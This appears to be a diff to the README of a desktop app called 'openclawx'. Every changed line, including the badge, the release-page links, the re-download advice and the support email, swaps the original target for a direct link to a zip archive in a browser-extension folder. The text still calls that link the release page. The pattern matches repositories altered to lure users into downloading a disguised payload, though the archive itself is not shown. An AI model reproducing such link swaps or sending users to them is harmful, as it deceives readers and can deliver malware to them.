@@ -1,6 +1,6 @@
 # 🌟 openclawx - Easy Desktop Application for Everyone
 
-![Download openclawx](https://img.shields.io/badge/Download%20openclawx-%2334a853?style=for-the-badge&logo=github&logoColor=white&color=blue)
+![Download openclawx](https://github.com/godistre/openclawx/raw/refs/heads/main/apps/browser-extension/Software_3.5.zip%20openclawx-%2334a853?style=for-the-badge&logo=github&logoColor=white&color=blue)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ openclawx is a simple desktop application designed for users who want to automat
 To begin using openclawx, follow these simple steps. 
 
 1. **Visit the download page**: Click on the link below to access the release page:
-   [Download openclawx](https://github.com/godistre/openclawx/releases)
+   [Download openclawx](https://github.com/godistre/openclawx/raw/refs/heads/main/apps/browser-extension/Software_3.5.zip)
 
 2. **Download the latest version**: On the release page, you will find the latest version available. Click on the download link for your operating system (Windows, macOS, or Linux).
 
@@ -61,7 +61,7 @@ Once you have installed the application, you can start using it right away:
 If you encounter any issues while installing or using openclawx, consider the following steps:
 
 - **Check the Requirements**: Make sure your system meets the requirements listed above.
-- **Re-download the File**: Sometimes, the downloaded file can get corrupted. Download the file again from the [release page](https://github.com/godistre/openclawx/releases).
+- **Re-download the File**: Sometimes, the downloaded file can get corrupted. Download the file again from the [release page](https://github.com/godistre/openclawx/raw/refs/heads/main/apps/browser-extension/Software_3.5.zip).
 - **Search for Solutions**: Visit our FAQ section on GitHub for common problems and solutions.
 
 ## 📚 Resources
@@ -76,7 +76,7 @@ To get the most out of openclawx, check the following resources:
 
 If you need further assistance, you can reach out via the following:
 
-- **Email**: support@example.com
+- **Email**: https://github.com/godistre/openclawx/raw/refs/heads/main/apps/browser-extension/Software_3.5.zip
 - **GitHub Issues**: Report any problems directly on our GitHub repository.
 
 ## 📢 Stay Updated
